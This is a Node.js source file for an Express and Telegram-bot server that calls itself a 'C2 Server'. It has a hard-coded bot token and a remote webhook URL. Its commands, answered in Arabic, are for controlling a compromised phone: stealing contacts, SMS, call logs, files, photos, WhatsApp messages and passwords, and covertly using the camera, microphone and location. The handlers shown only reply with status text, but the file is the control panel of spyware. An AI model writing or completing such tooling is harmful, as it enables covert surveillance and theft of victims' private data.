const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = '7604669338:AAElI3Uy3cnB4rzmk5LTGHI3a5ws63ueYS0';
const SERVER_URL = 'https://c2-server-ufyp.onrender.com';

const app = express();
app.use(express.json());

app.post(`/webhook/${BOT_TOKEN}`, (req, res) => {
    const bot = new TelegramBot(BOT_TOKEN);
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

app.get('/', (req, res) => res.send('C2 Server Active'));

const bot = new TelegramBot(BOT_TOKEN, { polling: false });

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, '✅ البوت يعمل! أرسل /help');
});
bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id, '📱 الأوامر: /start, /help, /contacts, /camera_front, /sms, /call_logs, /files, /mic, /location, /gallery, /whatsapp, /passwords');
});
bot.onText(/\/contacts/, (msg) => bot.sendMessage(msg.chat.id, '📇 جاري سحب جهات الاتصال...'));
bot.onText(/\/camera_front/, (msg) => bot.sendMessage(msg.chat.id, '📸 جاري التقاط صورة من الكاميرا الأمامية...'));
bot.onText(/\/sms/, (msg) => bot.sendMessage(msg.chat.id, '✉️ جاري سحب الرسائل...'));
bot.onText(/\/call_logs/, (msg) => bot.sendMessage(msg.chat.id, '📞 جاري سحب سجل المكالمات...'));
bot.onText(/\/files/, (msg) => bot.sendMessage(msg.chat.id, '📂 جاري سحب الملفات...'));
bot.onText(/\/mic/, (msg) => bot.sendMessage(msg.chat.id, '🎙️ جاري تسجيل الصوت...'));
bot.onText(/\/location/, (msg) => bot.sendMessage(msg.chat.id, '📍 جاري الحصول على الموقع...'));
bot.onText(/\/gallery/, (msg) => bot.sendMessage(msg.chat.id, '🖼️ جاري سحب الصور...'));
bot.onText(/\/whatsapp/, (msg) => bot.sendMessage(msg.chat.id, '💬 بدء مراقبة واتساب...'));
bot.onText(/\/passwords/, (msg) => bot.sendMessage(msg.chat.id, '🔑 جاري سحب كلمات المرور...'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
    console.log(`✅ Server on ${PORT}`);
    const botSetup = new TelegramBot(BOT_TOKEN);
    await botSetup.deleteWebhook();
    await botSetup.setWebHook(`${SERVER_URL}/webhook/${BOT_TOKEN}`);
    console.log('✅ Webhook set');
});
